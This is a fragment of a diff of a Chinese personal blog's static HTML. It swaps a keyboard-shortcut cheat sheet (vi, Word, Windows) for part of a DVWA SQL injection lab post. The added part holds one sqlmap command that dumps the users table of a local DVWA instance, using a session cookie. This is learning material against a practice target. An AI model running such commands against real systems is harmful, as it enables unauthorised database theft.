-<td>在移动范围为<em>m</em>的区域内拷贝文本，移动范围请查阅光标移动命令。（如：yw 为拷贝下一个词）</td>
-</tr>
-<tr>
-<td><strong>yy,Y</strong></td>
-<td>拷贝当前行</td>
-</tr>
-<tr>
-<td><strong>p,P</strong></td>
-<td>将拷贝的内容插入在光标前，后位置</td>
-</tr>
-</tbody></table>
-<h4 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h4><table>
-<thead>
-<tr>
-<th>按键</th>
-<th>解释</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>.</strong></td>
-<td>重复上一个编辑操作</td>
-</tr>
-<tr>
-<td><strong>u</strong></td>
-<td>撤销上一个编辑操作</td>
-</tr>
-<tr>
-<td><strong>U</strong></td>
-<td>撤销当前行的编辑操作</td>
-</tr>
-<tr>
-<td><strong>J</strong></td>
-<td>将光标所在行与下一行结合成同一行</td>
-</tr>
-</tbody></table>
-<h3 id="保存和退出"><a href="#保存和退出" class="headerlink" title="保存和退出"></a>保存和退出</h3><table>
-<thead>
-<tr>
-<th>按键</th>
-<th>解释</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>ZZ</strong></td>
-<td>保存并退出</td>
-</tr>
-<tr>
-<td><strong>:x</strong></td>
-<td>保存并退出</td>
-</tr>
-<tr>
-<td><strong>:wq</strong></td>
-<td>保存(“write” 写入)并退出</td>
-</tr>
-<tr>
-<td><strong>:w</strong></td>
-<td>保存文件</td>
-</tr>
-<tr>
-<td><strong>:w!</strong></td>
-<td>保存文件(强制)</td>
-</tr>
-<tr>
-<td><strong>:30,60w</strong> <em>newfile</em></td>
-<td>将从第30行到第60行的内容保存为新文件，叫做<em>newfile</em></td>
-</tr>
-<tr>
-<td><strong>:30,60w&gt;&gt;</strong> <em>file</em></td>
-<td>将从第30行到第60行的内容保存添加至文件<em>file</em></td>
-</tr>
-<tr>
-<td><strong>:q</strong></td>
-<td>退出</td>
-</tr>
-<tr>
-<td><strong>:q!</strong></td>
-<td>退出，放弃所有更改</td>
-</tr>
-<tr>
-<td><strong>:e!</strong></td>
-<td>放弃自上次保存后的所有修改</td>
-</tr>
-</tbody></table>
-<h2 id="word"><a href="#word" class="headerlink" title="word"></a>word</h2><ol>
-<li>Ctrl+A 全选</li>
-<li>Ctrl+C(或 Ctrl+Insert) 复制选择的项目</li>
-<li>Ctrl+X 剪切选择的项目</li>
-<li>Ctrl+V(或 Shift+Insert) 粘贴选择的项目</li>
-<li>Ctrl+Z 撤消操作</li>
-<li>Ctrl+S文档保存</li>
-<li>Ctrl+O 打开文档</li>
-<li>Ctrl+F 导航</li>
-<li>Ctrl+shift+f9 清除超链接</li>
-</ol>
-<h2 id="HTML-WEB"><a href="#HTML-WEB" class="headerlink" title="HTML WEB"></a>HTML WEB</h2><ol>
-<li>Ctrl+O 火狐打开html文档</li>
-<li>F12 查看源代码</li>
-<li>ctrl+shift+n chrome无痕模式</li>
-</ol>
-<h2 id="WIN"><a href="#WIN" class="headerlink" title="WIN"></a>WIN</h2><ol>
-<li>Win 桌面与开始菜单切换按键</li>
-<li>Win + R 打开运行对话框</li>
-<li>Win + Q 快速打开搜索</li>
-<li>Win + I 快速打开Win10设置栏</li>
-<li>Ctrl+Alt+Del 快速打开任务管理器 shift ctrl esc</li>
-<li>Alt+F4 关机快捷键</li>
-<li>win+shift+s截图</li>
-</ol>
-<h1 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h1><h2 id="大批量文件改后缀"><a href="#大批量文件改后缀" class="headerlink" title="大批量文件改后缀"></a>大批量文件改后缀</h2><ol>
-<li><p>在开始菜单运行中输入“cmd”进入命令提示符，进入需要修改后缀名的文件所在目录；</p>
-</li>
-<li><p>键入“<code>ren *.avi *.abc</code>”后回车</p>
-</li>
-<li><p>退出命令提示符即可</p>
-<p><strong>avi是要被改的后缀</strong></p>
-<p><strong>abc是要改成的后缀</strong></p>
+<li><p>最后看看整个表中都有什么</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="attribute">--cookie</span>=<span class="string">"security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1"</span> --batch -D dvwa -T<span class="built_in"> users </span>--dump</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>–dump参数将所有列的信息都列出来</li>
+</ul>
+<p><img src="image-20200415172329770.png" alt="image-20200415172329770"></p>
 </li>
 </ol>
 
@@ -929,7 +591,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://mercer5.github.io/2019/12/10/%E5%BF%AB%E6%8D%B7%E9%94%AE/" title="快捷键">https://mercer5.github.io/2019/12/10/%E5%BF%AB%E6%8D%B7%E9%94%AE/</a>
+    <a href="https://mercer5.github.io/2020/04/15/dvwa-sql-%E6%98%BE%E6%B3%A8-low/" title="dvwa-sql-显注-low">https://mercer5.github.io/2020/04/15/dvwa-sql-%E6%98%BE%E6%B3%A8-low/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -944,7 +606,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/%E5%9F%BA%E6%93%8D/" rel="tag"># 基操</a>
+            <a href="/tags/sql/" rel="tag"># sql</a>
           
         </div>
       
@@ -957,14 +619,18 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2020/04/08/next%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/" rel="next" title="next主题配置">
+                <i class="fa fa-chevron-left"></i> next主题配置
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/12/10/RSA/" rel="prev" title="RSA算法">
-                RSA算法 <i class="fa fa-chevron-right"></i>
+              <a href="/2020/04/15/%C2%96dvwa-sql-%E6%98%BE%E6%B3%A8-low/" rel="prev" title="dvwa-sql-显注-low">
+                dvwa-sql-显注-low <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -1046,7 +712,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">34</span>
+                  <span class="site-state-item-count">30</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1057,7 +723,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -1068,7 +734,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-count">15</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -1455,7 +1121,7 @@ if(canvas.getContext){
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#快捷键"><span class="nav-number">1.</span> <span class="nav-text">快捷键</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#F-fn"><span class="nav-number">1.1.</span> <span class="nav-text">F&#x2F;fn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VM"><span class="nav-number">1.2.</span> <span class="nav-text">VM</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Sublime-Text"><span class="nav-number">1.3.</span> <span class="nav-text">Sublime Text</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#vscode"><span class="nav-number">1.4.</span> <span class="nav-text">vscode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vi-Editor-Cheat-Sheet"><span class="nav-number">1.5.</span> <span class="nav-text">Vi Editor Cheat Sheet</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#光标移动命令"><span class="nav-number">1.5.1.</span> <span class="nav-text">光标移动命令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#字符"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">字符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文本"><span class="nav-number">1.5.1.2.</span> <span class="nav-text">文本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#行"><span class="nav-number">1.5.1.3.</span> <span class="nav-text">行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#滚动"><span class="nav-number">1.5.1.4.</span> <span class="nav-text">滚动</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#搜索"><span class="nav-number">1.5.1.5.</span> <span class="nav-text">搜索</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#行号"><span class="nav-number">1.5.1.6.</span> <span class="nav-text">行号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#标记位置"><span class="nav-number">1.5.1.7.</span> <span class="nav-text">标记位置</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#编辑命令"><span class="nav-number">1.5.2.</span> <span class="nav-text">编辑命令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#输入"><span class="nav-number">1.5.2.1.</span> <span class="nav-text">输入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#替换"><span class="nav-number">1.5.2.2.</span> <span class="nav-text">替换</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#删除，移动"><span class="nav-number">1.5.2.3.</span> <span class="nav-text">删除，移动</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Yank-拷贝"><span class="nav-number">1.5.2.4.</span> <span class="nav-text">Yank(拷贝)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#其他命令"><span class="nav-number">1.5.2.5.</span> <span class="nav-text">其他命令</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#保存和退出"><span class="nav-number">1.5.3.</span> <span class="nav-text">保存和退出</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#word"><span class="nav-number">1.6.</span> <span class="nav-text">word</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTML-WEB"><span class="nav-number">1.7.</span> <span class="nav-text">HTML WEB</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WIN"><span class="nav-number">1.8.</span> <span class="nav-text">WIN</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#tips"><span class="nav-number">2.</span> <span class="nav-text">tips</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#大批量文件改后缀"><span class="nav-number">2.1.</span> <span class="nav-text">大批量文件改后缀</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#dvwa-sql-显注-low"><span class="nav-number">1.</span> <span class="nav-text">dvwa-sql-显注-low</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#tip"><span class="nav-number">1.1.</span> <span class="nav-text">tip</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#low"><span class="nav-number">1.2.</span> <span class="nav-text">low</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#手工注入"><span class="nav-number">1.2.1.</span> <span class="nav-text">手工注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap"><span class="nav-number">1.2.2.</span> <span class="nav-text">sqlmap</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
@@ -1489,7 +1155,7 @@ if(canvas.getContext){
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">59k</span>
+    <span title="Site words total count">51.8k</span>
   
 </div>
 
